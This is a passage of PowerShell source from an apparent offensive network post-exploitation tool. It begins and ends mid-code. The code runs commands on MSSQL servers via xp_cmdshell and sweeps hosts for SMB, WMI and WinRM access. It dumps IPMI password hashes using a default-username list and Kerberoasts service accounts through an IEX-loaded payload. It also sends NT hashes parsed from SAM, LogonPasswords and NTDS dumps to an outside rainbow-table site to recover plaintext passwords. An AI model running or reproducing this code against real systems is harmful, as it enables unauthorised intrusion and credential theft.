
                else {
                    Write-Host "No output was returned from the command."
                }

                # Revert 'xp_cmdshell' if it was changed
                if ($revertXpCMDShell) {
                    Revert-Config -Option "xp_cmdshell" -Value 0
                }

                # Revert 'Show Advanced Options' if it was changed
                if ($revertAdvancedOptions) {
                    Revert-Config -Option "show advanced options" -Value 0
                }
            }

            # Start Impersonation (if required)
            if (!$LocalAuth -and $Username -ne "" -and $Password -ne "") {
                Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
            }

            function SQLAdminCheck {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Username,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )

                try {
                    # Create and open SQL connection
                    Write-Log -Message  "Opening SQL connection to $NamedInstance"
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
                    $SqlConnection.ConnectionString = $ConnectionString
                    $SqlConnection.Open()
        
                    # Create SQL command to check sysadmin membership
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
                    $IsSysAdmin = $SqlCommand.ExecuteScalar()
        
                    # Check if the user is a sysadmin
                    if ($IsSysAdmin -eq "1") {
                        $SYSADMIN = $True
                        if ($Command -ne "") {
                            # Execute the provided command
                            return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
                        }
                        else {
                            return "SUCCESS SYSADMIN"
                        }
                    }
                    elseif ($IsSysAdmin -eq "0") {
                        $SYSADMIN = $False
                        return "SUCCESS NOT SYSADMIN"
                    }
                    else {
                        $SYSADMIN = $False
                        return "ERROR"
                    }
                }
                catch {
                    Write-Error "Error occurred on $NamedInstance`: $_"
                    return $null
                }
                finally {
                    # Close SQL connection and clear pool
                    if ($SqlConnection -and $SqlConnection.State -eq 'Open') {
                        $SqlConnection.Close()
                        [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                    }
                }
            }

            function Test-SqlConnection {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance
                )
                if (!$LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }
                elseif ($LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }

                $connection = New-Object System.Data.SqlClient.SqlConnection
                $connection.ConnectionString = $ConnectionString
    
                try {
                    $connection.Open()
                    if ($connection.State -eq 'Open') {
                        if ($Username -ne "" -and $Password -ne "") {
                            return SQLAdminCheck -Username "$Username" -Password "$Password" -NamedInstance "$NamedInstance"
                        }
                        else {
                            return SQLAdminCheck -NamedInstance $NamedInstance
            
                        }
                    }
                }
                catch {
                    if ($_.Exception.Message -like "*Login failed for user*") { return "Access Denied" }
                    elseif ($_.Exception.Message -like "*error: 26*") { return "Unable to connect" }
                    elseif ($_.Exception.Message -like "*error: 40*") { return "Unable to connect" }
                    else { return "ERROR" }
                }
                finally {
                    if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) {
                        Invoke-Impersonation  -RevertToSelf
                    }
                    $connection.Close()
                    [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                }
            }

            $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
            try {
                $IP = $null
                $Ping = New-Object System.Net.NetworkInformation.Ping 
                $IPResult = $Ping.Send($ComputerNameFromInstance, 10)
                if ($IPResult.Status -eq 'Success') {
                    $IP = $IPResult.Address.IPAddressToString
                }
            }

            Catch { $IP = " " * 16 }
            return (Test-SqlConnection -NamedInstance $NamedInstance), $IP

            # revert impersonation (if required)
            if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) { Invoke-Impersonation  -RevertToSelf }
        }

        foreach ($NamedInstance in $AllInstances) {

    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace  = $runspace
                    Handle    = $runspace.BeginInvoke()
                    Instance  = $NamedInstance
                    Completed = $false
                })

        }

        $InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum

        [int]$Global:SuccessCount = 0
        
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $runspaceData = $runspace.Runspace.EndInvoke($runspace.Handle)
            
                    $result = $runspacedata[0]
                    $IP = $runspacedata[1]
            
                    $SysAdminFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-SYSADMIN-Accessible-MSSQL-Instances.txt")
                    $AccessibleFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-Accessible-MSSQL-Instances.txt")
            
                    if (!$Username) { $Username = $env:username }
                    if ($result -eq "Unable to connect") { continue }

                    if ($result -eq "Access Denied") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    if ($result -eq "ERROR") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR - $Result" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    elseif ($result -eq "Success") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($result -eq "SUCCESS SYSADMIN") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
                        continue            
                    }
           
            
                    elseif ($result -eq "SUCCESS NOT SYSADMIN") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($Command -ne "" -and $Result -ne "") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        Write-Output ""
                        Write-output $Result
                        Write-Output ""
                        continue
                    }

                    elseif ($result -like "*untrusted domain and cannot be used with Windows authentication*") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "Untrusted Domain" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })
        
        $runspacePool.Close()
        $runspacePool.Dispose()

        if (Test-Path -Path $SysAdminFilePath) {
            Get-Content -Path $SysAdminFilePath |
            Sort-Object -Unique |
            Set-Content -Path $SysAdminFilePath
        }

        if (Test-Path -Path $AccessibleFilePath) {
            Get-Content -Path $AccessibleFilePath |
            Sort-Object -Unique |
            Set-Content -Path $AccessibleFilePath
        }

    }

    ################################################################################################################
    ################################################ Function: All #################################################
    ################################################################################################################
    Function Method-all {
        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Domain, $Timeout, $IPAddress)

            Function Test-Port {
                param ($ComputerName, $Port)
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
                $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

                if ($wait) {
                    try {
                        $tcpClient.EndConnect($asyncResult)
                        return $true
                    }
                    catch {
                        return $false
                    }
                }
                else {
                    return $false
                }
            }

            # Check Ports
            $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
            $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
            $SMBPort = Test-Port -ComputerName $ComputerName -Port 445

            # if all three fail, return and kill the runspace
            if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
                return "Unable to connect"
            }

            # SMB Check
            if ($SMBPort) {
                $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
                if (-not $SMBCheck) {
                    $SMBAccess = $False
                }
                else {
                    $SMBAccess = $True
                }
            }

            # WMI Check
            if ($WMIPort) {
                try {
                    Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction Stop
                    $WMIAccess = $True
                }
                catch {
                    $WMIAccess = $False
                }
            }

            # WinRM Check
            if ($WinRMPort) {
                try {

                    if ($IPAddress) {
                        # Define the function before using it
                        function Resolve-IPToDNSName {
                            param (
                                [string]$IPAddress
                            )
                            try {
                                $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
                                return $hostEntry.HostName
                            }
                            catch {
                                return "Unable to resolve"
                            }
                        }

                        # Use the function to resolve DNS Name
                        $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
                    }

                    Invoke-Command -ComputerName $computerName -ScriptBlock { echo "Successful Connection PME" } -ErrorAction Stop
                    $WinRMAccess = $True
                }
                catch {
                    if ($_.Exception.Message -like "*Access is Denied*") {
                        $WinRMAccess = $False
                    }
                    elseif ($_.Exception.Message -like "*cannot be resolved*") {
                        $WinRMAccess = $False
                    }
                }
            }

            return @{
                WMIAccess   = $WMIAccess
                SMBAccess   = $SMBAccess
                WinRMAccess = $WinRMAccess
            }
        }

    

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                
                    if ($result -eq "Unable to connect") { continue }

                    # Build string of successful protocols
                    $successfulProtocols = @()
                    if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
                    if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
                    if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }

                    if ($successfulProtocols.Count -gt 0) {
                        $Global:SuccessCount ++
                        $statusText = $successfulProtocols -join ', '
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain
                        continue
                    }
                    else {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ################################################ Function: All #################################################
    ################################################################################################################
    Function Method-IPMI {
     
        $Global:DisplayedIPMIUserCount = $False
        
        function Send-Receive {
            [CmdletBinding()]
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [System.Net.Sockets.UdpClient]$Sock,

                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [Byte[]]$Data,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )

            $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
            $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
            $receiveBytes = $Sock.Receive([ref]$remoteEP)
            return $receiveBytes
        }

        function Test-IP {
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [Byte[]]$SessionID,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [System.Net.Sockets.UdpClient]$Sock,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )

            $attemptLimit = 3
            $attemptCount = 0

            while ($attemptCount -lt $attemptLimit) {

                $data = 0x06, 0x00, 0xff, 0x07
                $data += 0x06, 0x10, 0x00, 0x00
                $data += 0x00, 0x00, 0x00, 0x00
                $data += 0x00, 0x00, 0x20, 0x00
                $data += 0x00, 0x00, 0x00, 0x00
                $data += $SessionID
                $data += 0x00, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00
                $data += 0x01, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00
                $data += 0x02, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00

                try {
                    $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
                    return $sResponse1
                }

                catch [System.Net.Sockets.SocketException] {
                    Write-Log -Message  "[S] $IP does not have IPMI/RMCP+ running or is not vulnerable (Attempt $attemptCount)(User=$User)"
                    $attemptCount++

                    if ($attemptCount -eq $attemptLimit) {
                        if ($SuccessOnly) { $Sock.close ; return -111 }
                        if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength 16 }
                        elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                        $Sock.Close()
                        return -111
                    }
                }
            }
        }

        function Attempt-Retrieve {
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$User,

                [Parameter(Mandatory = $true)]
                [ValidatePattern('^\d{1,3}(\.\d{1,3}){3}$')] 
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )
    
            $attemptLimit = 3
            $attemptCount = 0
            $IPMISuccess = $False

            while ($attemptCount -lt $attemptLimit) {

                $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | % { [Byte[]]$_ }
                $sock = New-Object System.Net.Sockets.UdpClient
                $sock.Client.ReceiveTimeout = 250

                $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
                if ($tResponse -eq -111) {
                    $sock.Close()
                    return -111
                }

                if ($tResponse.Length -gt 0) {

                    $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | % { [Byte[]]$_ }
                    $sUserLength1 = [Byte]($User.Length + 28), 0x00
                    $sUserLength2 = [Byte]$User.Length
                    $sHexUser = [System.Text.Encoding]::ASCII.GetBytes($User)
                    $rRequestID = $tResponse[24..27]

                    $data = 0x06, 0x00, 0xff, 0x07
                    $data += 0x06, 0x12
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += $sUserLength1
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += $rRequestID  
                    $data += $rRequestSALT
                    $data += 0x14, 0x00, 0x00
                    $data += $sUserLength2
                    $data += $sHexUser

        
                    try {
                        $sResponse1 = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
                        $iMessageLength = $sResponse1[14]
                        if ($sResponse1[17] -eq 18) {
                            #Write-Host "[-] Invalid username: $User"
                            return
                        }
                        if ($iMessageLength -eq 60) {

                            $sResponseData = $sResponse1[24..$sResponse1.Length]

                            if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {
                                $Global:IPMI_halt = $true
                                $rSessionIDHex = ($rSessionID | ForEach-Object ToString X2) -join ''
                                $rRequestIDHex = ($rRequestID | ForEach-Object ToString X2) -join ''
                                $rResponseSALTHex = ($sResponseData[0..31] | ForEach-Object ToString X2) -join ''
                                $rResponseHashHex = ($sResponseData[32..$sResponseData.Length] | ForEach-Object ToString X2) -join ''
                                $sUserLength2Hex = ($sUserLength2 | ForEach-Object ToString X2) -join ''
                                $sHexUserHex = ($sHexUser | ForEach-Object ToString X2) -join ''
                                $rRequestSALTHex = ($rRequestSALT | ForEach-Object ToString X2) -join ''
                                $Hash = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex + $rResponseSALTHex + '14' + $sUserLength2Hex + $sHexUserHex + ':' + $rResponseHashHex
                                $Hash = $Hash.ToLower()
                                $IPMISuccess = $True
   
                                if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength 16 }
                                elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                                
                                Write-Host
                                $User + ":" + $Hash | Write-Host
                                
                                if (-not (Test-Path -Path "$IPMI\.IPMI-All.txt")) { New-Item -Path "$IPMI" -Name ".IPMI-All.txt" -ItemType "File" -Force }
                                if (-not (Test-Path -Path "$IPMI\$ComputerName.txt")) { New-Item -Path "$IPMI" -Name "$ComputerName.txt" -ItemType "File" -Force }
                                
                                if (-not (Get-Content "$IPMI\$ComputerName.txt" | Select-String -Pattern "^${User}:")) { $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\$ComputerName.txt" }
                                if (-not (Get-Content "$IPMI\.IPMI-All.txt" | Select-String -Pattern "\[${ComputerName}\]${User}")) { "[" + $ComputerName + "]" + $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\.IPMI-All.txt" }

                                Write-Host
                                
                                $attemptCount = 3
                            }

                        }
                        else {
                            $sock.Close()
                            return
                        }

                    }
                    catch {
                        # Error AR
            
                        $attemptCount ++
                        Write-Log -Message  "[A] Trying user again (Attempt=$AttemptCount)(User=$User)"
                        $sock.Close()
                    }

                    finally {
                        $sock.Close()
    
                    }
                }
            }
    
            if ($IPMISuccess) {

                Get-Content -Path "$IPMI\.IPMI-All.txt" | Get-Unique | Set-Variable -Name IPMIUniqueContent
                $IPMIUniqueContent | Set-Content -Path "$IPMI\.IPMI-All.txt" -Force
    
            }
        }

        function Invoke-IPMIDump {
            [CmdletBinding(DefaultParameterSetName = 'Default')]
            Param(
                [Parameter(Mandatory = $false)]
                [string]$Users,

                [Parameter(Mandatory = $true)]
                [string]$IP,

                [Parameter(Mandatory = $false)]
                [string]$Option, 

                [Parameter()]
                [int]$Port = 623
            )

            if (![System.Net.Dns]::GetHostAddresses("$IP")) {
                return "Unable to resolve DNS Name"
            }

            if ($Option -eq "IPMI:DomainUsers") {
                Write-Log -Message  "[IPMI] Using domain users as a user list"
    
                $IPMIUsers = $EnabledDomainUsers
            } 

            elseif ($Option -like "IPMI:*") {
            
                $IPMIUsers = $Option.Split(':')[1]
            
            }
            
            else {
                Write-Log -Message  "[IPMI] Using built in user list"
    
                $IPMIUsers = @(
                    "Admin", "admin", "administrator", "ADMIN", "root", "USERID",
                    "ipmiadmin", "superuser", "operator", "service", "support",
                    "guest", "default", "system", "remote", "supervisor", "tech",
                    "Administrator", "manager", "test"
                )
            }

            if (!$Global:DisplayedIPMIUserCount) {
    
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Trying $($IPMIUsers.count) usernames against any identified IPMI candidates"
                Write-Host
                Start-Sleep -Seconds 3
                $Global:DisplayedIPMIUserCount = $true
    
            }

            $Global:IPMI_halt = $false
            foreach ($user in $IPMIUsers) {
                if ($Global:IPMI_halt) { break }
                $res = Attempt-Retrieve -User $user -Port $Port -IP $IP
                if ($res -eq -111) {
                    break
                }
            }
        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
                $IP = if ((($Result = (New-Object System.Net.NetworkInformation.Ping).Send($ComputerName, 250)).Status) -eq 'Success') { $Result.Address.IPAddressToString }
                try { Invoke-IPMIDump -IP $IP -Option $Option } Catch {}
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
                Invoke-IPMIDump -IP $ComputerName -Option $Option
            }

        }
        
    }

    ################################################################################################################
    ################################################ Function: Kerberoast ##########################################
    ################################################################################################################
    function Method-Kroast {
        IEX $Global:rst

        if ($Option -like "Kerberoast:*") {
            $SplitUser = $Option.Split(':')[1]
            $RoastOutput = Invoke-Kroast /domain:$Domain /user:$SplitUser | Out-String
        }
        else {
            $RoastOutput = Invoke-Kroast /domain:$Domain | Out-String
        }

        if ($RoastOutput -eq "None Found") {
            Write-Host "[-] No candidate user accounts found" -ForegroundColor Red
            return
        }

        if ($ShowOutput) { $RoastOutput }

        $currentDateTime = Get-Date -Format "yyyyMMdd_HHmmss"
        $type18FilePath = Join-Path -Path $Kerberoast -ChildPath "type-18_$currentDateTime.txt"
        $type23FilePath = Join-Path -Path $Kerberoast -ChildPath "type-23_$currentDateTime.txt"

        function AppendBlob {
            param (
                [string]$blobData,
                [string]$filePath
            )
            Add-Content -Path $filePath -Value $blobData
            Add-Content -Path $filePath -Value "`n"
        }

        $RoastOutput -split "`n" | ForEach-Object {
            $line = $_.Trim()
        
            if ($line.StartsWith("User")) {
                $user = $line -replace "User\s+:\s+", ""
                Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                Write-Host "$($Domain.ToUpper())\$user"
            }

            if ($line.Contains('$krb5tgs$18$')) {
                AppendBlob -blobData $line -filePath $type18FilePath
            }
            elseif ($line.Contains('$krb5tgs$23$')) {
                AppendBlob -blobData $line -filePath $type23FilePath
            }
        }

        Write-Host
        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline 
        Write-Host "Output written to $Kerberoast"
        Write-Host
    }

    ################################################################################################################
    ################################################# Function: AdminCount #########################################
    ################################################################################################################

    function AdminCount {
        param (
            [string]$UserName,
            [System.DirectoryServices.DirectorySearcher]$Searcher
        )

        $Searcher.Filter = "(sAMAccountName=$UserName)"
        $Searcher.PropertiesToLoad.Clear()
        $Searcher.PropertiesToLoad.Add("adminCount") > $null

        $user = $Searcher.FindOne()

        if ($user -ne $null) {
            $adminCount = $user.Properties["adminCount"]
            if ($adminCount -eq 1) {
                return $true
            }
        }
        return $false
    }

    ################################################################################################################
    ############################################ Function: RainbowCheck ############################################
    ################################################################################################################

    Function RainbowCheck {
        param ($Module, $RCFilePath)

        if (-not (Test-Path -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' does not exist."
            return
        }

        if (!(Get-Content -Path $RCFilePath)) {
            Write-Warning "The file at '$RCFilePath' is empty."
            return
        }

        function Rainbow-SAM {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^\[(.+?)\](.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $hostname = $matches[1] -replace '^\[|\]$', ''  # Remove brackets from the hostname
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Hostname = $hostname
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-LogonPasswords {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?)\\(.+?):([a-f0-9A-F]{32})$") {
                    $domain = $matches[1]
                    $username = $matches[2]
                    $ntHash = $matches[3]
                    New-Object PSObject -Property @{
                        Domain   = $domain
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        function Rainbow-NTDS {
            $hashEntries = Get-Content -Path $RCFilePath | ForEach-Object {
                if ($_ -match "^(.+?):\d*?:[a-f0-9A-F]{32}:([a-f0-9A-F]{32}).*?$") {
                    $username = $matches[1]
                    $ntHash = $matches[2]
                    New-Object PSObject -Property @{
                        Username = $username
                        NTHash   = $ntHash
                    }
                }
            }
            return $hashEntries
        }

        $NTLMpwURL = "https://ntlm.pw/" 

        $parsedData = switch ($Module) {
            "SAM" { Rainbow-SAM -FilePath $RCFilePath }
            "LogonPasswords" { Rainbow-LogonPasswords -FilePath $RCFilePath }
            "NTDS" { Rainbow-NTDS -FilePath $RCFilePath }
        }

        # Group users by their NTLM hash
        $groupedHashEntries = $parsedData | Group-Object NTHash

        # Construct the POST request body with the NT hashes (unique hashes only)
        $hashesBody = ($groupedHashEntries.Name -join "%0D%0A")

        # Send a POST request to the server
        $response = Invoke-WebRequest -Uri $NTLMpwURL -Method Post -Body "hashes=$hashesBody" -ContentType "application/x-www-form-urlencoded" -UseBasicParsing

        if ($response.StatusCode -eq 200) {
            $htmlContent = $response.Content

            $pattern = "<tr>\s*<td class=`"font-monospace`">\s*<h6>(.+?)</h6>\s*</td>\s*<td>\s*<h6>(.+?)</h6>\s*</td>\s*</tr>"
            $matches = Select-String -InputObject $htmlContent -Pattern $pattern -AllMatches
            
            $results = if ($matches.Matches.Count -gt 0) {
                $matches.Matches | ForEach-Object {
                    $hash = $_.Groups[1].Value
                    $password = $_.Groups[2].Value
            
                    if ($password -ne "[not found]") {
                        $groupedHashEntries | Where-Object { $_.Name -eq $hash } | ForEach-Object {
                            $_.Group | ForEach-Object {
                                New-Object -TypeName PSObject -Property @{
                                    Hostname = $_.Hostname
                                    Domain   = $_.Domain
                                    Username = $_.Username
                                    Hash     = $hash
                                    Password = $password
                                }
                            }
                        }
                    }
                }
            } 

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Checking collected hashes against an online rainbow table"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Only values for which the password is known will be shown"

            Write-host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "URL: $NTLMpwURL"

            Write-Host

            switch ($Module) {
                "SAM" {
                    $sortedResults = $results | Sort-Object Hostname
                    $sortedResults | Format-Table -Property Hostname, Username, Hash, Password -AutoSize
                }
                "LogonPasswords" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Domain, Username, Hash, Password -AutoSize
                }
                "NTDS" {
                    $sortedResults = $results | Sort-Object Username
                    $sortedResults | Format-Table -Property Username, Hash, Password -AutoSize
                }
            }
        } 
        elseif ($response.StatusCode -eq 429) { Write-Warning "Quota Exceeded on lookup" }
        else { Write-Warning "Error communicating with $NTLMpwURL" }
    }

    ################################################################################################################
    ################################################# Function: ConvertTo-NT #######################################
    ################################################################################################################

    function ConvertTo-NT {
        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $true,
                ValueFromPipeline = $true)]
            [ValidateNotNull()]
            [String]
            $String
        )

        begin {
            $Decoder = [System.Text.Encoding]::Unicode
        }

        process {
            $Array = $Decoder.GetBytes($String)

            $M = [System.Collections.ArrayList]@()
            for ($i = 0; $i -le ($Array.count - 1); $i++) {
                $null = $M.Add($Array[$i])
            }

            $null = $M.Add(0x80)
            while ($M.count % 64 -ne 56) { $null = $M.Add(0) }
            for ($i = 1; $i -le 8; $i++) { $null = $M.Add([int]0) }

            [Byte[]]$M = $M
            @([BitConverter]::GetBytes($Array.Count * 8)).CopyTo($M, $M.Count - 8)

            $A = [Convert]::ToUInt32('0x67452301', 16)
            $B = [Convert]::ToUInt32('0xefcdab89', 16)
            $C = [Convert]::ToUInt32('0x98badcfe', 16)
            $D = [Convert]::ToUInt32('0x10325476', 16)

            if (-not ([System.Management.Automation.PSTypeName]"Shift").Type) {
                Add-Type -TypeDefinition @'
    public class Shift
    {
        public static uint Left(uint a, int b)
        {
            return ((a << b) | (((a >> 1) & 0x7fffffff) >> (32 - b - 1)));
        }
    }
'@ | Out-Null
            }


            function FF([uint32]$X, [uint32]$Y, [uint32]$Z) {
            (($X -band $Y) -bor ((-bnot $X) -band $Z))
            }
            function GG([uint32]$X, [uint32]$Y, [uint32]$Z) {
            (($X -band $Y) -bor ($X -band $Z) -bor ($Y -band $Z))
            }
            function HH([uint32]$X, [uint32]$Y, [uint32]$Z) {
            ($X -bxor $Y -bxor $Z)
            }

            for ($i = 0; $i -lt $M.Count; $i += 64) {
                $AA = $A
                $BB = $B
                $CC = $C
                $DD = $D

                $A = [Shift]::Left(($A + (FF -X $B -Y $C -Z $D) + [BitConverter]::ToUInt32($M[($i + 0)..($i + 3)], 0)) -band [uint32]::MaxValue, 3)
